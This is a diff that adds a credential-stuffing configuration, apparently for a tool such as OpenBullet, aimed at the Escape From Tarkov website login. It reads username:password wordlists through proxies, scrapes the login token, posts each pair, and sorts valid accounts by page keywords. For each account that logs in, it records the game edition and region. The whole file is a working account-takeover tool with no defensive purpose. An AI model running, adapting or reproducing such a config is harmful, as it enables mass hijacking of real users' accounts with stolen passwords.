@@ -1,0 +1,51 @@
+[SETTINGS]
+{
+  "Name": "Escape From Tarkov (UserPass)",
+  "SuggestedBots": 1,
+  "LastModified": "2018-05-16T12:09:16.6626651+00:00",
+  "AdditionalInfo": "",
+  "Author": "Secant",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#Get_Login REQUEST GET "https://www.escapefromtarkov.com/login" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "host: www.escapefromtarkov.com" 
+#PARSE_TOKEN PARSE "<SOURCE>" CSS "[id=token]" "value" 0 -> VAR "TOKEN" "" "" 
+#POST_Login REQUEST POST "https://www.escapefromtarkov.com/login" AutoRedirect=TRUE 
+  CONTENT "login=<USER>&password=<PASS>&remember_me=1&signup=login&form_id=User-FrontLoginForm&token=<TOKEN>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://www.escapefromtarkov.com/login" 
+  HEADER "host: www.escapefromtarkov.com" 
+  HEADER "origin: https://www.escapefromtarkov.com" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "pre-order now" 
+    KEY "Incorrect username or password" 
+    KEY "Complete auth" 
+  KEYCHAIN Success OR 
+    KEY "profile" 
+#PARSE_Edition PARSE "<SOURCE>" LR "\" /></a></span>Escape from Tarkov" "</li></ul>	</div>" Recursive=FALSE -> CAP "Edition" "" "" 
+#PARSE_Region PARSE "<SOURCE>" LR "\">Region: <a class=\"inlinetop\" href=\"/support/knowledge/356\" target=\"_blank\">" "</a></div>" Recursive=FALSE -> CAP "Region" "" "" 
